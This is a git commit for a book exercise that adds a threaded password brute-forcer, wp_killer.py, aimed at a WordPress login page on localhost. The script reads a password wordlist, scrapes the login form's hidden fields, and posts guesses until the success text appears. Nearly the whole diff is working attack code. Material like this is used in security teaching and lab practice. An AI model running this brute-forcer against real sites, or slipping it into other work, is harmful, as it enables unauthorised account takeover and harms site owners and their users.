0eaf51d63a2a603e12945ec51bef124c67f5647b
Jelai Wang <14236583+jelaiw@users.noreply.github.com>
2022-02-15 16:09:12 +0000

    Add Bruter class and driver for wp_killer.py exercise.
    Fix minor typos from code listing in book.

--- wp_killer.py
+++ wp_killer.py
@@ -2,7 +2,13 @@ from queue import Queue
 from lxml import etree
 from io import BytesIO
 
+import threading
+import requests
+import time
+
 WORDLIST = '/home/kali/repos/SecLists/Passwords/Software/cain-and-abel.txt'
+TARGET = 'http://localhost/wp-login.php'
+SUCCESS = "Welcome to WordPress!"
 
 def get_words():
 	with open(WORDLIST) as f:
@@ -24,3 +30,41 @@ def get_params(content):
 			params[name] = element.get('value', None)
 	
 	return params
+
+class Bruter:
+	def __init__(self, username, url):
+		self.username = username
+		self.url = url
+		self.found = False
+		print(f'\nBrute Force Attack beginning on {url}.\n')
+		print("Finished the setup where username = %s\n" % username)
+
+	def run_bruteforce(self, passwords):
+		for _ in range(2):
+			t = threading.Thread(target=self.web_bruter, args=(passwords,))
+			t.start()
+
+	def web_bruter(self, passwords):
+		session = requests.Session()
+		resp0 = session.get(self.url)
+		params = get_params(resp0.content)
+		params['log'] = self.username
+
+		while not passwords.empty() and not self.found:
+			time.sleep(5)
+			passwd = passwords.get()
+			print(f'Trying username/password {self.username}/{passwd:<10}')
+			params['pwd'] = passwd
+
+			resp1 = session.post(self.url, data=params)
+			if SUCCESS in resp1.content.decode():
+				self.found = True
+				print(f'\nBruteforcing successful.')
+				print("Username is %s" % self.username)
+				print("Password is %s\n" % passwd)
+				print('done: now cleaning up other threads.')
+
+if __name__ == '__main__':
+	words = get_words()
+	b = Bruter('user', TARGET)
+	b.run_bruteforce(words)
